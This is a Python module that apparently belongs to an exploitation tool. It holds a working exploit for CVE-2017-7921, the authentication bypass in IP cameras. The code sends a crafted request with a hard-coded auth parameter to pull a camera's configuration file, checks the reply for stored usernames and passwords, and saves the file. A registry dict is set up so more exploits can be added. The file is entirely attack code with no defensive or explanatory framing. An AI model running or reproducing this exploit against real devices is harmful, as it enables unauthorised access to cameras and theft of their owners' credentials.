import aiohttp
import logging
from rich.console import Console

console = Console()
async def exploit_cve_2017_7921(target_ip: str, port: int, session: aiohttp.ClientSession):
    exploit_url = f"http://{target_ip}:{port}/System/configurationFile?auth=YWRtaW46MTEK"
    console.print(f"[yellow]CVE-2017-7921 trying: {exploit_url}[/yellow]")
    try:
        async with session.get(exploit_url, timeout=10) as response:
            if response.status == 200:
                content = await response.read()
                if b"<userName>" in content and b"<password>" in content:
                    console.print("[bold green]Vulnerability IS SUCCESSFUL! The device configuration file has been downloaded.[/bold green]")
                    filename = f"CVE-2017-7921_{target_ip}.conf"
                    with open(filename, 'wb') as f:
                        f.write(content)
                    return f"Successful. The configuration file was saved as '{filename}'. Check the contents."
                else:
                    return "Unsuccessful. The server returned 200 OK, but the expected content was not found."
            else:
                return f"Unsuccessful. Server {response.status} The status code has returned."
    except Exception as e:
        logging.error(f"CVE-2017-7921 exploit error: {e}")
        return f"Error: {e}"

#exploit registry
EXPLOIT_REGISTRY = {
    "CVE-2017-7921": exploit_cve_2017_7921,
    #"CVE-XXXX-YYYY": new function like this exploit_cve_xxxx_xxxx
}
